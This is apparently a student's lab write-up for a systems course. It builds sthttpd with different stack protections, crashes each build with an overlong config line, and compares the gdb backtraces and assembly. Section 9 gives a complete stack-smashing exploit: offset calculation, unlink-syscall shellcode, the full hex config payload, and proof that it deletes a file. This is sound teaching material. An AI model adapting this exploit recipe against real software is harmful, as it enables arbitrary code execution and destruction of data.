@@ -1,0 +1,572 @@
+Sagar Doshi
+UID : 604901376
+smashinglab.txt
+
+1.)
+$ which gcc
+/usr/local/cs/bin/gcc
+
+Downloaded 2.27 sthttpd and used winSCP to transfer it into a new directory on the linux server (lab3)
+
+__________________________________________________________________________________
+
+2.)
+Applied the patch command:
+In the src directory, copied and pasted the patch file in the spec into a new patch file created with
+$ vi thttpd.patch 
+$ patch -i thttpd.patch
+
+Checked the thttpd.c source code  to see that the patch was applied.
+
+Tried to run 
+$./configure \LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+Got "permission denied"
+Ran the following command
+$ chmod +777 configure
+
+ran the command successfully this time.
+
+Went into the lab3/src directory compiled the executables with the following commands:
+
+(SP)
+$ make clean
+$ make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+$ mv thttpd thttpd-sp
+
+export PATH=/usr/local/cs/bin:$PATH
+(AS) TODO
+$ make clean
+$ make CFLAGS='-g3 -O2 -fno-inline -fsanitize=address -static-libasan'
+$ mv thttpd thttpd-as
+
+(NO)
+$ make clean
+$ make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+$ mv thttpd thttpd-no
+
+________________________________________________________________________________________
+
+3.)
+(MY UID is 604901376)
+Based on the formula given: port = (12330 + 3 * (X % 293) + Y)
+(SP) 13048
+(AS) 13049
+(NO) 13050
+
+changed directory to lab 3
+
+ran the commands to start the server for the various executables
+$ src/thttpd-sp -p 13048 -D
+$ src/thttpd-as -p 13049 -D
+$ src/thttpd-no -p 13050 -D
+
+4.)
+opened another instance of PuTTy (you can't input commands on the terminal that is running the server)
+
+to check if it was working ran the command:
+$ curl http://localhost:13048
+$ curl http://localhost:13048/README
+
+The first command showed the working directory of the server that was being run.
+The second command displayed the README file that was a part of the working directory.
+=> The server is running correcly on normal settings.
+
+To terminate the running server used ctrl^c
+
+Repeated this for the -as and -no variants using the commands
+
+$ curl http://localhost:13049
+$ curl http://localhost:13049/README
+
+$ curl http://localhost:13050
+$ curl http://localhost:13050/README
+
+_________________________________________________________________________________________________
+
+5.) Breaking the SP variant.
+
+$ vi thttpd.c
+:1002 (line 1002)
+
+We are looking at this particular file, because it contains the read_config function which is what the patch changes.
+
+If we want to break the server, we have to create our own config file so that we can run the server like line below (exmample)
+$ $src/thttpd-sp -p 13048 -D -c badconfig.txt
+
+In other words, our ability to crash the server comes from supplying it a bad config file BECAUSE the read_config function was changed.
+
+What the read_config file is doing (with a lot of if-else statements) is parsing and then interpreting the config.txt file that it was supplied.
+The patch introduces the issue because of the re-sizing of the char array line from 10,000 to 100.
+We can supply a config file that induces overflow.
+
+So the first thing I attempted to do is create a file called config.txt, and I just put ~120 of the character s, and unfortunately the server still worked.
+In other words my config.txt file was as follows
+
+ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss
+
+I realized this is because the read_config function has code to check for valid words, so the word I repeat MUST be a valid keyword.
+
+So, looking at the c code we can just rip one of the conditionals
+
+else if ( strcasecmp( name, "debug" ) == 0 )
+
+So if i repeat the word "debug" more than 100 times I should get an overflow.
+So, my config.txt file looks like the following.
+
+debug debug debug (repeated 120 times)
+
+BUT THE SERVER STILL WORKED.
+
+I realized  this is because the char array is actually storing ONE LINE parsed from the text file. So repeating debug debug debug ... etc. 
+is parsing separate (white-space separated lines) so it's not overflowing anything.
+
+Therefore, we want a SINGLE,VALID line that can overflow the function.
+
+else if ( strcasecmp( name, "port" ) == 0 )
+
+I then made my config.txt file 
+
+port="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+
+and this successfully broke the server as it was one parsed line that exceeded  the 100 character limit.
+
+Becuase we need to get a backtrace of the crash we can do the following to run the code INSIDE the gdb debugger.
+
+$ cd lab3
+$ gdb src/thttpd-sp
+(gdb) set args -p 13048 -D -C config.txt
+(gdb) run
+Starting program: /w/home.18/ma/ugrad/doshi/CS33/lab3/src/thttpd-sp -p 13048 -D -C config.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+*** stack smashing detected ***: /w/home.18/ma/ugrad/doshi/CS33/lab3/src/thttpd-sp terminated
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff6da50b8 in ?? () from /lib64/libgcc_s.so.1
+Missing separate debuginfos, use: debuginfo-install glibc-2.17-222.el7.x86_64 libgcc-4.8.5-28.el7_5.1.x86_64 nss-softokn-freebl-3.36.0-5.el7_5.x86_64
+(gdb) bt
+#0  0x00007ffff6da50b8 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff6da5fb9 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00007ffff76e3ba6 in backtrace () from /lib64/libc.so.6
+#3  0x00007ffff7647ce4 in __libc_message () from /lib64/libc.so.6
+#4  0x00007ffff76e7677 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00007ffff76e7632 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x0000000000404c03 in read_config (filename=<optimized out>) at thttpd.c:1190
+#7  0x6161616161616161 in ?? ()
+#8  0x6161616161616161 in ?? ()
+#9  0x6161616161616161 in ?? ()
+#10 0x6161616161616161 in ?? ()
+#11 0x6161616161616161 in ?? ()
+#12 0x6161616161616161 in ?? ()
+#13 0x6161616161616161 in ?? ()
+#14 0x6161616161616161 in ?? ()
+#15 0x6161616161616161 in ?? ()
+#16 0x6161616161616161 in ?? ()
+#17 0x0000000022616161 in ?? ()
+#18 0x00007ffff7ddb000 in ?? ()
+#19 0x00007ffff7ffe4a8 in ?? ()
+#20 0x00007ffff7ddb7d0 in ?? () from /lib64/ld-linux-x86-64.so.2
+#21 0x0000000000000000 in ?? ()
+
+
+The key line in the backtrace is 
+#6  0x0000000000404c03 in read_config (filename=<optimized out>) at thttpd.c:1190
+
+So we therefore set a breakpoint at the 1190 line in thttpd.c
+
+(gdb) break thttpd.c:1190
+Breakpoint 1 at 0x404b56: file thttpd.c, line 1190.
+(gdb) set disassemble-next-line on
+(gdb) run
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /w/home.18/ma/ugrad/doshi/CS33/lab3/src/thttpd-sp -p 13048 -D -C config.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+
+Breakpoint 1, read_config (filename=<optimized out>) at thttpd.c:1190
+1190        }
+=> 0x0000000000404b56 <read_config+1190>:       48 8b 44 24 68  mov    0x68(%rsp),%rax
+   0x0000000000404b5b <read_config+1195>:       64 48 33 04 25 28 00 00 00      xor    %fs:0x28,%rax
+   0x0000000000404b64 <read_config+1204>:       0f 85 94 00 00 00       jne    0x404bfe <read_config+1358>
+   0x0000000000404b6a <read_config+1210>:       48 83 c4 78     add    $0x78,%rsp
+   0x0000000000404b6e <read_config+1214>:       5b      pop    %rbx
+   0x0000000000404b6f <read_config+1215>:       5d      pop    %rbp
+   0x0000000000404b70 <read_config+1216>:       41 5c   pop    %r12
+   0x0000000000404b72 <read_config+1218>:       41 5d   pop    %r13
+   0x0000000000404b74 <read_config+1220>:       c3      retq
+
+Now the key machine instruction is xor instruction at <read_config+1195>
+xor    %fs:0x28,%rax
+
+The textbook mentions this kind of validation to protect the stack.
+This is comparing %fs:0x28 (the saved address of the stack pointer before any buffering was done) to %rsp + 0x68 (the 0x68 is how far we are SUPPOSed to have moved)
+If these values don't match, something went wrong with the stack and then you jump with the instruciton:
+jne    0x404bfe <read_config+1358>
+
+What you jump to is the handler for buffer overflow which is the following insn. (obtained using the gdb si insn.)
+=> 0x0000000000404bfe <read_config+1358>:       e8 cd d4 ff ff  callq  0x4020d0 <__stack_chk_fail@plt>
+
+So clearly, this xor insn. is doing the comparison to validate the stack pointer, and finds that its value has been modified
+in an undesirable way. It then executes a jump in order to call the handler that activates when the stack check fails.
+
+________________________________________________________________________________________________________________________________-
+
+6.)
+
+$ cd lab 3
+$ gdb src/thttpd-as
+(gdb) set args -p 13049, -D -C config.txt
+(gdb) run
+
+==12644==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffcd2                       4 at pc 0x00000048a72c bp 0x7fffffffcc80 sp 0x7fffffffc430
+READ of size 169 at 0x7fffffffcd24 thread T0
+    #0 0x48a72b in __interceptor_strchr ../../../../gcc-8.2.0/libsanitizer/sanit                       izer_common/sanitizer_common_interceptors.inc:618
+    #1 0x50b6dd in read_config /u/ma/ugrad/doshi/CS33/lab3/src/thttpd.c:1018
+
+... and some other stuff.. Baseically we want to set a break point at c:1018
+
+Breakpoint 1, read_config (filename=<optimized out>) at thttpd.c:1018
+1018            if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
+=> 0x000000000050b6d0 <read_config+176>:        48 8b 3c 24     mov    (%rsp),%rdi
+   0x000000000050b6d4 <read_config+180>:        be 23 00 00 00  mov    $0x23,%esi
+   0x000000000050b6d9 <read_config+185>:
+    e8 e2 f2 f7 ff      callq  0x48a9c0 <__interceptor_strchr(char const*, int)>
+   0x000000000050b6de <read_config+190>:        48 85 c0        test   %rax,%rax
+   0x000000000050b6e1 <read_config+193>:        74 23   je     0x50b706 <read_config+230>
+(gdb) si
+0x000000000050b6d4      1018            if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
+   0x000000000050b6d0 <read_config+176>:        48 8b 3c 24     mov    (%rsp),%rdi
+=> 0x000000000050b6d4 <read_config+180>:        be 23 00 00 00  mov    $0x23,%esi
+   0x000000000050b6d9 <read_config+185>:        e8 e2 f2 f7 ff  callq  0x48a9c0 <__interceptor_strchr(c                                                                                                                                      har const*, int)>
+   0x000000000050b6de <read_config+190>:        48 85 c0        test   %rax,%rax
+   0x000000000050b6e1 <read_config+193>:        74 23   je     0x50b706 <read_config+230>
+(gdb) si
+0x000000000050b6d9      1018            if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
+   0x000000000050b6d0 <read_config+176>:        48 8b 3c 24     mov    (%rsp),%rdi
+   0x000000000050b6d4 <read_config+180>:        be 23 00 00 00  mov    $0x23,%esi
+=> 0x000000000050b6d9 <read_config+185>:        e8 e2 f2 f7 ff  callq  0x48a9c0 <__interceptor_strchr(char const*, int)>                                                                                                                               har const*, int)>
+   0x000000000050b6de <read_config+190>:        48 85 c0        test   %rax,%rax
+   0x000000000050b6e1 <read_config+193>:        74 23   je     0x50b706 <read_config+230>
+
+Cleary the call to <__interceptor_strchr(char const*, int)> is what instantiates the crashing process for the server in this compilation case.
+This is clearly the protection method employed by fsanitize-inline=address
+_______________________________________________________________________________________________________-------
+
+7.)
+$ cd lab3
+$ gdb src/thttpd-no
+(gdb) set args -p 13050 -D -C config.txt
+(gdb) run
+Starting program: /w/home.18/ma/ugrad/doshi/CS33/lab3/src/thttpd-no -p 13050 -D -C config.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000004049d0 in read_config (filename=<optimized out>) at thttpd.c:1190
+1190        }
+(gdb) bt
+#0  0x00000000004049d0 in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#1  0x6161616161616161 in ?? ()
+#2  0x0061616161616161 in ?? ()
+#3  0x00000005f76c7400 in ?? ()
+#4  0x0000000000000000 in ?? ()
+
+Missing separate debuginfos, use: debuginfo-install glibc-2.17-222.el7.x86_64 nss-softokn-freebl-3.36.0-5.el7_5.x86_64 // Asking to install an update it seems.
+
+Once again the offending line is 1190 (as expected)
+
+(gdb) break thttpd.c:1190
+Breakpoint 1 at 0x4049c6: file thttpd.c, line 1190.
+(gdb) set disassemble-next-line on
+(gdb) run
+
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /w/home.18/ma/ugrad/doshi/CS33/lab3/src/thttpd-no -p 13050 -D -C config.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+
+Breakpoint 1, read_config (filename=<optimized out>) at thttpd.c:1190
+1190        }
+=> 0x00000000004049c6 <read_config+1174>:       48 83 c4 78     add    $0x78,%rsp
+   0x00000000004049ca <read_config+1178>:       5b      pop    %rbx
+   0x00000000004049cb <read_config+1179>:       5d      pop    %rbp
+   0x00000000004049cc <read_config+1180>:       41 5c   pop    %r12
+   0x00000000004049ce <read_config+1182>:       41 5d   pop    %r13
+   0x00000000004049d0 <read_config+1184>:       c3      retq
+   
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000004049d0 in read_config (filename=<optimized out>) at thttpd.c:1190
+1190        }
+   0x00000000004049c6 <read_config+1174>:       48 83 c4 78     add    $0x78,%rsp
+   0x00000000004049ca <read_config+1178>:       5b      pop    %rbx
+   0x00000000004049cb <read_config+1179>:       5d      pop    %rbp
+   0x00000000004049cc <read_config+1180>:       41 5c   pop    %r12
+   0x00000000004049ce <read_config+1182>:       41 5d   pop    %r13
+=> 0x00000000004049d0 <read_config+1184>:       c3      retq
+(gdb) si
+
+Program terminated with signal SIGSEGV, Segmentation fault.
+The program no longer exists.
+
+
+There is no semblance of stack protection for the (NO) case.
+After incrementing the stack pointer to "restore the stack" and free used memory, %rsp is NOT pointing to where it should be.
+Therefore, when the function returns, you get a segmentation fault because the stack has been corrupted and you "return" to an invalid location. 
+(Technically) the ret insn. is "causing" the crash as you're not returning to a valid spot on the stack, 
+but in reality it's the fact that buffer overflow was allowed to corrupt the stack in the first place that makes return instruction invalid.
+This therefore leads to vulnerabilities that can be exploited in part (9) of this lab.
+
+_______________________________________________________________________________________________________________________________________________________
+
+8.) 
+
+For all the assembly files, the following warning was generated by gcc (lineker warnings)
+gcc: warning: thttpd.o: linker input file unused because linking not done
+gcc: warning: fdwatch.o: linker input file unused because linking not done
+gcc: warning: libhttpd.o: linker input file unused because linking not done
+gcc: warning: mmc.o: linker input file unused because linking not done
+gcc: warning: timers.o: linker input file unused because linking not done
+gcc: warning: tdate_parse.o: linker input file unused because linking not done
+gcc: warning: libmatch.a: linker input file unused because linking not done
+
+The following commands are used to generate the assembly files.
+
+$ cd lab/src
+
+(SP)
+$ make clean
+$ make CFLAGS='-g3 -O2 -S -fno-inline -fstack-protector-strong'
+$ mv thttpd.o thttpd-sp.s
+
+export PATH=/usr/local/cs/bin:$PATH
+(AS) TODO
+$ make clean
+$ make CFLAGS='-g3 -O2 -S -fno-inline -fsanitize=address -static-libasan'
+$ mv thttpd.o thttpd-as.s
+
+(NO)
+$ make clean
+$ make CFLAGS='-g3 -O2 -S -fno-inline -fno-stack-protector -zexecstack'
+$ mv thttpd.o thttpd-no.s
+
+The first noticeable difference in the assembly files is that the AS file is significantly bigger than the otther two files (~5000 lines longer). 
+
+In terms of the handle_read functions, the -NO variant does absolutely nothing to protect against stack corruption. so there isn't really much to note in the assembly.
+
+In terms of the SP file
+-fstack-protector-strong
+The way this technique works is to place "checking" bits before & after the buffer.
+If the stack is corrupted then those check bits have been changed meaning that, __stack_chk_fail() and its subsequent functions will be called.
+
+This is why the assembly code for this file really isn't that different from the -NO variant. It really only needs to add the checking bits as 
+well as the the call to __stack_chk_fail() and its subsidiary functions.
+
+In terms of the AS file.
+-fsanitize=address
+
+in vim we can type:
+/handle_read
+to find the handle_read function in this enormous assembly file.
+Then, we can analyze how this actually works. 
+There is a much greater amount of assembly in this implementation. The reason for this is that:
+-this method creates "shadow memory" around the buffer (this is seen in the full console output when we crash the server in this case.)
+-it maps any shadowed memory to memory marked as corrupted.
+-It has to REPEATEDTLY CHECK whether or not memory was shadowed and if this is the case it then throws a segmentation fault.
+
+Example checking assembly for this case:
+
+.L1102:
+        .loc 1 1605 5
+        .loc 1 1606 19 is_stmt 0
+        movq    %rcx, %rax
+        .loc 1 1605 10
+        subq    %rsi, %rdx
+        .loc 1 1606 19
+        shrq    $3, %rax
+        cmpb    $0, 2147450880(%rax)
+        jne     .L1221
+        .loc 1 1605 10
+        leaq    704(%rbx), %r14
+        .loc 1 1606 15
+        addq    144(%rbx), %rsi
+        .loc 1 1605 10
+        movq    %r14, %rax
+        shrq    $3, %rax
+        movzbl  2147450880(%rax), %eax
+        testb   %al, %al
+        je      .L1109
+        cmpb    $3, %al
+        jle     .L1222
+
+In this block of assembly, TWO checks are being performed. The shrq assembly is being executed for the purpose of moving the buffer so that
+the validation can be done. (THIS IS LINE 6837 of thttpd-as.s)
+
+All this checking overhead explains the GREATLY increased file size for thttpd-as.s
+
+However, both these methods at least provide some protection as compared thttpd-no.s which is susceptible to exloits as in part (9) below.
+_______________________________________________________________________________________________________________________________________________
+
+
+9.)
+
+As per the TA's advice (chi), the NX bit must be disabled for this to work - compiler flag handles this.
+In addition, to delete a file, we must find the correct x86 system calls (unlink function is useful), as per TAs advice => google => 0x57
+
+The key to the exploit is that the stack has no protection AND it is marked as executable. (both of these are unrealistic).
+Presumably, stack-randomization is disabled (also unrealistic), but we could hypothetically achieve even greater
+consistency if we used a nop-sled to align our injected code properly
+
+We want to figure out WHERE we can insert our code first.
+
+We create a valid (empty) config file
+vi config.txt
+
+$ cd CS33/lab3
+$ gdb src/thttpd-no
+(gdb) set args -p 13050 -D -C config.txt
+(gdb) break read_config //(thttpd.c:1000)
+(gdb) set disassemble-next-line on
+(gdb) run
+Starting program: /w/home.18/ma/ugrad/doshi/CS33/lab3/src/thttpd-no -p 13050 -D -C config.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+
+Breakpoint 1, read_config (filename=0x7fffffffe4d1 "config.txt") at thttpd.c:1000
+1000        {
+=> 0x0000000000404530 <read_config+0>:  41 55   push   %r13
+(gdb) info reg rsp
+rsp            0x7fffffffce98   0x7fffffffce98 // return address
+(gdb) p &line // base of buffer array
+$1 = (char (*)[100]) 0x7fffffffce00
+
+We can subtract to the two values to obtain the proper offset. 
+0x7fffffffce98 - 0x7fffffffce00 = 0x98 = 152 bytes 
+Ret addr - base = Offset
+
+Return Address:
+0x7fffffffce98
+
+Base of Array:
+0x7fffffffce00
+
+So our config file should be something like
+port=...
+where the size of this junk is 152 bytes.
+
+The name of the file we want to delete is victim.txt
+Therefore we need to know the hex value of "victim.txt^@"
+(Note that ^@ is the vim editor representation of the null character.)
+
+To find the hex value of victim.txt we do the following:
+create a file called str.txt
+inside the file is just 
+victim.txt^@
+
+xxd victim_converter.txt
+
+76 69 63 74 69 6d 2e 74 78 74 00
+
+The total bytes to represent this string is 11
+
+Now the structure of our exploit is coming together.
+
+The hex for it will look like the following.
+																0s here are for alignment
+| 152 bytes of junk in the form port=... | return address + 11 + 8 | 00 00 | 11 byte hex representation of victim.txt^@ | malicious assembly |
+											add 11 and 8 because size of address is 8 bytes, size of victim.txt^@ is 11 bytes.
+											note that we have to reverse the return address because we are on a little-endian machine.
+We now need to find the assembly we want to execute.
+
+So we create a .s file with the assembly we want to execute.
+
+(Googled how to use system call to delete a file)
+
+// assembly.s
+mov $0x7fffffffcea0,%rdi // 0x7fffffffcea0=return address + 8, i.e start of hex representation of victim.txt^@
+movq    $0x57, %eax //appropriate system call
+syscall
+
+the 0x57 comes from googling the appropriate system call for deleting a file.
+
+We then use gcc -c assembly.s
+objdump -d assembly.o
+
+We obtain the below output in the terminal:
+
+0000000000000000 <.text>:
+   0:   48 bf a0 ce ff ff ff    movabs $0x7FFFFFFFCEA0,%rdi
+   7:   7f 00 00
+   a:   b8 57 00 00 00          mov    $0x57,%eax
+   f:   0f 05                   syscall
+
+
+Therefore, we merge the hexcode to get the exploit code of:
+48 bf a0 ce ff ff ff 7f 00 00 b8 57 00 00 00 0f 05 
+
+// hex config - saved as hex.txt 
+
+port=filler to get to 152, REVERSED return address (because little endian machines are what we are working on), hex for victim.txt^@, malicious code
+
+note: 41 = ascii chracter hex for 'A', we could have chosen any other character.
+port= (147 41s) AB CE FF FF FF 7F 00 00 76 69 63 74 69 6d 2e 74 78 74 00 48 bf a0 ce ff ff ff 7f 00 00 b8 57 00 00 00 0f 05
+
+
+// As per chi's advice (TA) we have to convert this to ASCII to get it to work as a config file.
+
+We use the reverse functionality of xxd
+
+xxd -r -p hex.txt config.txt
+
+I manually wrote in the port=at the front of all the hex in the config.txt file.
+
+put victim.txt file in lab3 directory.
+
+Here below is the terminal window as PROOF of the deletion.
+
+[doshi@lnxsrv09 ~/CS33/lab3]$ ls
+aclocal.m4  config.h       config.txt    docs        Makefile     README    str.txt     www
+a.out       config.h.in    configure     extras      Makefile.am  scripts   thttpd.s
+assembly.o  config.log     configure.ac  hex.txt     Makefile.in  src       TODO
+assembly.s  config.status  depcomp       install-sh  missing      stamp-h1  victim.txt
+[doshi@lnxsrv09 ~/CS33/lab3]$ gdb src/thttpd-no
+GNU gdb (GDB) Red Hat Enterprise Linux 7.6.1-110.el7
+Copyright (C) 2013 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-redhat-linux-gnu".
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>...
+Reading symbols from /w/home.18/ma/ugrad/doshi/CS33/lab3/src/thttpd-no...done.
+(gdb)
+(gdb) set args -p 13050 -D -C config.txt
+(gdb) run
+Starting program: /w/home.18/ma/ugrad/doshi/CS33/lab3/src/thttpd-no -p 13050 -D -C config.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007fffffffceca in ?? ()
+Missing separate debuginfos, use: debuginfo-install glibc-2.17-222.el7.x86_64 nss-softokn-freebl-3.36.0-5.el7_5.x86_64
+(gdb) quit
+A debugging session is active.
+
+        Inferior 1 [process 18981] will be killed.
+
+Quit anyway? (y or n) y
+[doshi@lnxsrv09 ~/CS33/lab3]$ ls
+aclocal.m4  config.h       config.txt    docs        Makefile     README    str.txt
+a.out       config.h.in    configure     extras      Makefile.am  scripts   thttpd.s
+assembly.o  config.log     configure.ac  hex.txt     Makefile.in  src       TODO
+assembly.s  config.status  depcomp       install-sh  missing      stamp-h1  www
+
+victim.txt has been DELETED!!!!!
+
+I inderstand that visualizing the hex and config file might be difficult to interpret they are attached. str.txt is also attached.
+
+NOTE : This was ran on server port 13050, and we can modify the source code if either %rsp or the file name changed and the exploit will still work.
